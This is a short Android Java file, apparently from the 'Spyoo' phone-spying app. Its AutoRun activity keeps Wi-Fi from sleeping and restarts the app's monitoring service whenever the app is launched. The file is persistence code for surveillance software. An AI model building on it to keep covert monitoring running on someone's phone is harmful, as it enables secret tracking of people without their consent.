package iits.spyoo;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;
import android.provider.Settings;
import android.util.Log;
import iits.code.bus.Setting_BUS;
import iits.service.SpyooService;

public class AutoRun extends Activity {
    private static final String TAG = "AutoRun";

    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.autorun);
        try {
            if (Setting_BUS.get(getApplicationContext()) != null) {
                Settings.System.putInt(getContentResolver(), "wifi_sleep_policy", 2);
                stopService(new Intent(this, SpyooService.class));
                startService(new Intent(this, SpyooService.class));
                finish();
            }
        } catch (Exception e) {
            Log.e(TAG, "Error on onCreate function: " + e.toString());
        }
    }
}
